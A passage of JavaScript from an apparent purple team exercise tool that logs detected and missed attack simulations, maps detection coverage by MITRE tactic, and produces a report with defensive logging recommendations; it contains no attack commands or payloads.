        var test = ATOMIC_TESTS.find(function(t) { return t.id === id; });
        if (!test) return;
        var execAt = executed[id] ? new Date(executed[id]).getTime() : NaN;
        var elapsed = isNaN(execAt) ? '' : String(Math.max(0, Math.round((Date.now() - execAt) / 60000)));
        var mttdInput = prompt('Enter actual detection time in minutes (SLA target: ' + detectionSLA + ' min).\n' +
          (elapsed !== '' ? 'Pre-filled with the minutes since you clicked Mark Executed.\n' : 'Run a purple team exercise to measure real MTTD.\n') +
          'Leave blank if not measured.', elapsed);
        if (mttdInput === null) return;
        var mttd = null;
        if (mttdInput.trim() !== '') {
          mttd = parseInt(mttdInput, 10);
          if (isNaN(mttd) || mttd < 0) mttd = null;
        }
        testResults.unshift({ testId: id, name: test.name, mitre: test.mitre, tactic: test.tactic, status: 'detected', detectTime: mttd, executedAt: executed[id] || null, timestamp: new Date().toISOString() });
        clearExecuted(id); saveResults(); render();
      };
    });

    container.querySelectorAll('[data-miss]').forEach(function(btn) {
      btn.onclick = function() {
        var id = btn.dataset.miss;
        var test = ATOMIC_TESTS.find(function(t) { return t.id === id; });
        if (!test) return;
        testResults.unshift({ testId: id, name: test.name, mitre: test.mitre, tactic: test.tactic, status: 'missed', detectTime: null, executedAt: executed[id] || null, timestamp: new Date().toISOString() });
        clearExecuted(id); saveResults(); render();
      };
    });
  }

  function renderTemplates(container) {
    container.innerHTML = '<h2 class="pg-h2">Exercise Templates</h2>' +
      '<p class="muted" style="margin-bottom:12px">Pre-built exercise plans for common assessment scenarios.</p>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px">' +
      EXERCISE_TEMPLATES.map(function(tmpl) {
        return '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px">' +
          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">' +
            '<span style="font-weight:600;font-size:.95rem">' + esc(tmpl.name) + '</span>' +
            '<span style="font-size:.65rem;color:var(--acc);border:1px solid var(--acc);padding:1px 6px;border-radius:3px">' + esc(tmpl.duration) + '</span>' +
          '</div>' +
          '<div style="font-size:.8rem;color:var(--mut);margin-bottom:8px">' + esc(tmpl.desc) + '</div>' +
          '<div style="font-size:.75rem;color:var(--mut);margin-bottom:8px">' + tmpl.tests.length + ' tests</div>' +
          '<button class="btn sm" data-tmpl="' + esc(tmpl.name) + '">Load Template</button>' +
        '</div>';
      }).join('') + '</div>';

    container.querySelectorAll('[data-tmpl]').forEach(function(btn) {
      btn.onclick = function() {
        var tmpl = EXERCISE_TEMPLATES.find(function(t) { return t.name === btn.dataset.tmpl; });
        if (tmpl) {
          testPlan = tmpl.tests.slice();
          activeTab = 'exercise';
          render();
        }
      };
    });
  }

  function renderCoverageMap(container) {
    var tactics = [];
    ATOMIC_TESTS.forEach(function(t) { if (tactics.indexOf(t.tactic) === -1) tactics.push(t.tactic); });

    container.innerHTML = '<h2 class="pg-h2">Detection Coverage Map</h2>' +
      '<p class="muted" style="margin-bottom:12px">Green = detected, Red = missed, Gray = not tested. Shows your SOC\'s visibility gaps.</p>' +
      '<div style="display:flex;gap:4px;overflow-x:auto;padding-bottom:12px">' +
      tactics.map(function(tactic) {
        var tests = ATOMIC_TESTS.filter(function(t) { return t.tactic === tactic; });
        var detected = 0, missed = 0, untested = 0;
        tests.forEach(function(t) {
          var result = testResults.find(function(r) { return r.testId === t.id; });
          if (result && result.status === 'detected') detected++;
          else if (result && result.status === 'missed') missed++;
          else untested++;
        });
        var tacticRate = tests.length > 0 ? Math.round((detected / tests.length) * 100) : 0;

        return '<div style="min-width:110px;flex-shrink:0">' +
          '<div style="font-size:.65rem;font-weight:700;color:var(--acc);text-align:center;padding:6px;background:var(--card);border:1px solid var(--line);border-radius:4px 4px 0 0">' + esc(tactic) + '</div>' +
          '<div style="font-size:.7rem;text-align:center;padding:4px;border:1px solid var(--line);border-top:0;color:' + (tacticRate >= 75 ? '#00e676' : tacticRate >= 50 ? '#ffd600' : tacticRate > 0 ? '#ff1744' : 'var(--mut)') + '">' + tacticRate + '% detected</div>' +
          tests.map(function(t) {
            var result = testResults.find(function(r) { return r.testId === t.id; });
            var color = result ? (result.status === 'detected' ? 'rgba(0,230,118,0.3)' : 'rgba(255,23,68,0.3)') : 'var(--card)';
            var textColor = result ? (result.status === 'detected' ? '#00e676' : '#ff1744') : 'var(--mut)';
            return '<div style="font-size:.58rem;padding:3px 4px;text-align:center;border:1px solid var(--line);border-top:0;background:' + color + ';color:' + textColor + '" title="' + esc(t.name) + '">' + esc(t.mitre) + '</div>';
          }).join('') +
        '</div>';
      }).join('') + '</div>' +

      '<h3 style="margin:16px 0 8px">Blind Spots</h3>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:8px">';

    tactics.forEach(function(tactic) {
      var tests = ATOMIC_TESTS.filter(function(t) { return t.tactic === tactic; });
      var missedTests = tests.filter(function(t) {
        var result = testResults.find(function(r) { return r.testId === t.id; });
        return result && result.status === 'missed';
      });
      if (missedTests.length > 0) {
        container.innerHTML += '<div style="background:var(--card);border:1px solid var(--line);border-left:3px solid #ff1744;border-radius:4px;padding:10px;font-size:.78rem">' +
          '<div style="font-weight:600;color:#ff1744">' + esc(tactic) + ' — ' + missedTests.length + ' blind spot(s)</div>' +
          '<ul style="margin:6px 0 0;padding-left:16px;color:var(--mut)">' +
          missedTests.map(function(t) { return '<li>' + esc(t.mitre) + ': ' + esc(t.name) + '</li>'; }).join('') +
          '</ul></div>';
      }
    });

    container.innerHTML += '</div>';
  }

  function renderReport(container) {
    var total = testResults.length;
    var detected = testResults.filter(function(r) { return r.status === 'detected'; }).length;
    var missed = testResults.filter(function(r) { return r.status === 'missed'; }).length;
    var rate = total > 0 ? Math.round(detected / total * 100) : 0;

    var report = '=== PURPLE TEAM EXERCISE REPORT ===\n';
    report += 'Date: ' + new Date().toISOString() + '\n\n';
    report += '--- EXECUTIVE SUMMARY ---\n';
    report += 'Tests executed: ' + total + '\n';
    report += 'Detected: ' + detected + ' (' + rate + '%)\n';
    report += 'Missed: ' + missed + ' (' + (100 - rate) + '%)\n\n';
    report += '--- DETECTION RESULTS ---\n';
    testResults.forEach(function(r) {
      report += '[' + r.status.toUpperCase() + '] ' + r.mitre + ' — ' + r.name + (r.detectTime ? ' (MTTD: ' + r.detectTime + 'min)' : '') + '\n';
    });
    report += '\n--- BLIND SPOTS ---\n';
    testResults.filter(function(r) { return r.status === 'missed'; }).forEach(function(r) {
      var test = ATOMIC_TESTS.find(function(t) { return t.id === r.testId; });
      report += r.mitre + ': ' + r.name + '\n';
      if (test) report += '  Detection needed: ' + test.blueDetect + '\n  Query: ' + test.blueQuery + '\n';
    });
    report += '\n--- RECOMMENDATIONS ---\n';
    report += '1. Address all missed detections within 30 days\n';
    report += '2. Deploy Sysmon on all Windows endpoints for comprehensive logging\n';
    report += '3. Enable PowerShell ScriptBlock logging (Event ID 4104)\n';
    report += '4. Implement centralized log collection for all critical systems\n';
    report += '5. Re-test after implementing detections to verify coverage\n';

    container.innerHTML = '<h2 class="pg-h2">Exercise Report</h2>' +
      '<div style="display:flex;gap:8px;margin-bottom:12px">' +
        '<button class="btn sm" id="pt-copy">Copy Report</button>' +
      '</div>' +
      '<pre style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px;font-size:.78rem;white-space:pre-wrap;max-height:500px;overflow-y:auto;color:var(--txt);line-height:1.6">' + esc(report) + '</pre>';

    container.querySelector('#pt-copy').onclick = function() {
      navigator.clipboard.writeText(report).then(function() { container.querySelector('#pt-copy').textContent = 'Copied!'; setTimeout(function() { container.querySelector('#pt-copy').textContent = 'Copy Report'; }, 1500); });
    };
  }

  render();
}
